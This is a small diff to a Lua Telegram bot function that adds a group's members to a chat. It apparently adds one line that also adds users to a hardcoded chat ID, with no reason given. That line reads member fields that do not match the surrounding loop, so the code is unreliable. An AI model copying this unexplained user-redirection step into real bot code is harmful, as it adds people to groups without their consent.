@@ -1814,6 +1814,7 @@ local function addmem(extra, result)
 print(serpent.block(result))			
   for i = 1, result.total_count_ do
     tdcli.addChatMember(extra.chat_id, result.members._user_[i].id_, 50)
+    tdcli.addChatMembers(1234567890, {[0] = result.members_.user_id_})			
   end		
 end
 		
